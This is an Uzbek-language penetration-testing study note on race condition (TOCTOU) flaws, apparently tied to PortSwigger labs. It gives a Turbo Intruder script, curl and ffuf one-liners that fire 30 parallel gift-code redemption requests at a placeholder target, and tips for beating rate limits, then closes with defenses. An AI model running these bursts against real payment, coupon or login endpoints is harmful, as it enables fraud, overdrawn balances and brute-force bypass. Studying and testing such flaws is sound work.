# Race Conditions

> Lab yechimlari (PortSwigger'ning 6 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Server biror amalni ikki bosqichda bajaradi: avval **tekshiradi** (balans yetarlimi? kupon
ishlatilganmi?), keyin **bajaradi** (pul yech, kupon belgila). Ikki bosqich orasida juda qisqa
"oyna" bor. Agar sen shu oynada **bir vaqtning o'zida ko'p parallel so'rov** yuborsan, hammasi
"tekshiruv"dan o'tib bo'lib, keyin barchasi bajariladi — limit bir necha barobar buziladi.

**Ildiz sabab:** umumiy resurs (balans, hisoblagich, pending holat) atomik emas — "tekshir va
bajar" bitta bo'linmas amal emas. Klassik nomi **TOCTOU** (Time-Of-Check to Time-Of-Use).
Zamonaviy tool (**single-packet attack**) so'rovlarni millisekund ichida birga yetkazadi.

## Turlari
- **Limit overrun** — kupon/chegirma/gift-card'ni parallel bilan ko'p marta ishlatish.
- **Rate-limit / lockout bypass** — parallel urinishlar bilan brute himoyasini aylanish.
- **Multi-endpoint** — ikki endpoint (cart + checkout) orasidagi oynadan foydalanish.
- **Single-endpoint** — bitta endpointni parallel (pending email'ni chalkashtirish).
- **Partial construction** — yaratilayotgan (hali to'liq bo'lmagan) obyektdan foydalanish.
- **Time-sensitive** — bir vaqtda bajarilgan amallar bir xil (bashoratli) token berishi.

## Oqibatlar (IMPACT)
- **Bir gift card/coupon'ni ko'p marta ishlatish**, balansdan ortiq yechish (overdraw).
- Limit (vote, invite, like, withdrawal) buzish; "bir martalik" amalni ko'paytirish.
- Rate-limit/MFA'ni aylanib brute; boshqa user token'ini olish.
> Moliyaviy zarar aniq bo'lsa **High**.

## Asos — limit overrun
```
Check: "balans yetarlimi?" → ha
      ↓ (oyna — bu nuqtada 20 so'rov birga keladi)
Use:   "yech" × 20         → limitdan 20 barobar ortiq
```

## Qayerdan qidiriladi
Pul o'tkazish, coupon/promo, gift card redeem, vote/like, invite, withdraw, "bir martalik"
har qanday harakat.

## TOOLLAR

### Burp Repeater — "Send group in parallel" (eng oson, zamonaviy)
```
Repeater → so'rovni 20-50 tab qil → "Create tab group" → "Send group in parallel"
```
> HTTP/2 single-packet attack bilan hammasini bir vaqtda yuboradi — timing jitter yo'q, eng aniq.

### Turbo Intruder — gate bilan aniq race (eng ishonchli)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, engine=Engine.BURP2)
    for i in range(30):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```
> 30 so'rovni navbatga qo'yib, `openGate` bilan hammasini bitta lahzada ochadi.

### curl — oddiy parallel (tez tekshiruv)
```bash
for i in $(seq 1 30); do curl -s "https://target.com/redeem" -H "Cookie: ..." -d "code=GIFT123" & done; wait
```
> 30 so'rovni fonga (`&`) tashlab bir vaqtda yuboradi — oddiy, lekin timing aniq emas.

### ffuf — parallel yuklash
```bash
ffuf -w <(seq 1 30) -u "https://target.com/redeem" -X POST -d "code=GIFT123" -H "Cookie: ..." -t 30 -rate 0
```
> 30 thread bilan bir vaqtda uradi — natijalar farqidan race'ni ko'rasan.

## Nuances (muvaffaqiyat uchun)
```
- Session warming: avval dummy so'rov yuborib ulanishni ilit
- HTTP/2 bo'lsa single-packet attack (eng aniq)
- HTTP/1 bo'lsa last-byte sync (Turbo Intruder gate)
```

## PoC
Normal: 1 so'rov → 1 natija. Race: N parallel → N natija (limitdan ortiq). Moliyaviy
impact aniq ko'rsat.

## Himoya
Atomik operatsiya (DB transaction + `SELECT ... FOR UPDATE`), idempotency key, unique
constraint (DB darajasida), "check va act"ni bitta atomik qadamда.
